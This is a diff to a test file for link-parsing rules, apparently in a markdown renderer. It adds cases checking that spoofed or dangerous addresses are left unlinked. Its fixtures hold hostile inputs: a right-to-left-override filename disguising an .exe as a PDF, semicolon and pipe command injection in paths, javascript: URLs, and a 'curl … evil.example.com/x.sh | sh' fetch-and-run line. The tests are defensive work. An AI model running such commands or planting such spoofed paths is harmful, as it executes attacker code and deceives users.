@@ -59,10 +59,18 @@ describe('link rules', () => {
     '[x](https://user:pw@example.com)', '[x](https://)', '[x](ftp://example.com/a)', '[x](mailto:sam@example.com)', '[ ](https://example.com)',
     '[x](javascript:https://example.com)', '[x](file:///Users/sam/%E0%A4%A)', '[x](file://user@host/a)',
     'javascript:alert(1) data:text/html,hi vbscript:x', 'file:relative/path', 'myfile:///Users/sam/a',
+    // Nothing invisible, direction-changing or shell-active may reach the clipboard or hide in an address.
+    '[report.pdf](file:///tmp/%E2%80%AEgpj.exe)', '[x](file:///tmp/a%C2%85b)', '[x](file:///tmp/a%E2%80%A8b)', '[x](file:///tmp/a%3Bopen%20b)',
+    '[x](/Users/sam/a;open)', 'file:///tmp/a%7Csh', '[x](https://ok.example.com/\u200b)', '[x](https://ok.example.com/\u202egpj)',
   ])('leaves an unusable destination exactly as typed: %s', content => {
     expect(shape(content)).toEqual([['text', content]]);
   });
 
+  it('does not offer a command line as a path to copy', () => {
+    const line = '/Users/sam/ ; curl https://evil.example.com/x.sh | sh ; x.sh';
+    expect(linkParts(line).filter(part => part.t === 'path')).toEqual([]);
+    expect(linkParts('/tmp/a;open b and `/tmp/b`').filter(part => part.t === 'path')).toEqual([]);
+  });
   it('loses no character and stays quick on hostile input', () => {
     for (const content of ['[a](b) [c](d) [e](https://e.example.com)', '[[[[', ']('.repeat(50), '[x](file:///Users/s/a) /Users/s/b ~/c https://d.example.com file:///e']) {
       expect(linkParts(content).map(part => part.source).join('')).toBe(content);
@@ -71,7 +79,7 @@ describe('link rules', () => {
     for (const big of ['['.repeat(20000), '[a]('.repeat(5000), '[a](file:'.repeat(2500), 'file://'.repeat(3000), '[x](https://e.example.com) '.repeat(700)]) {
       expect(linkParts(big).map(part => part.source).join('')).toBe(big);
     }
-    expect(Date.now() - started).toBeLessThan(3000);
+    expect(Date.now() - started).toBeLessThan(1500);
   });
 
   it('reads a path out of a file address', () => {
